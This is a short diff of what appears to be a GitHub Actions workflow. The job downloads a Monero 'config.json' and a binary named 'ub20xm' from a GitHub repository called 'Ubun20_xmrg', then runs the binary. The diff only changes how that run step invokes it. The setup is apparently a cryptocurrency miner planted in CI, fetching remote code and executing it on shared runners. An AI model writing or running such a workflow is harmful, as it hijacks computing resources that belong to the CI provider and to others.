@@ -16,4 +16,4 @@ jobs:
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Monero/config.json
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm
     - name: Ejecutar.
-      run: .\ub20xm
+      run: ub20xm
